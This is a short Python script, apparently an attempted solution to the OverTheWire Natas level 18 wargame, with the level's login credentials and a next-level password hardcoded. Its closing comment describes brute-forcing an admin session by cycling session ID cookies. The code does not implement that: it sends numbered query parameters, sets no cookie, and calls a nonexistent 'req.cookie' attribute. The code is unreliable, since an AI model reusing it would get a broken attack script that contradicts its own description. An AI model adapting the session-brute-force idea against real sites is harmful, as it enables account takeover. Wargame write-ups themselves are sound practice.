import requests

username = 'natas18'
password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
url = 'http://natas18.natas.labs.overthewire.org/'

session = requests.session()

for i in range(1, 641):
	params = {"username": str(i), "password": str(i+1)}
	req = session.get(url, params=params ,auth = (username, password)) # cookie key value pair must be an string
	print(req.cookie)



# pass: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs

'''
	we cannot set a cookie "admin" and set it to '1'
	the php code will set it zero anyways
	we can set the "PHOSESSID", users must have this cookie, so admin also must have this
	also admin is uniques, so the admin a session cookie must be alloated for the admin
	loop through all the possible "PHOSESSID" cookie
'''
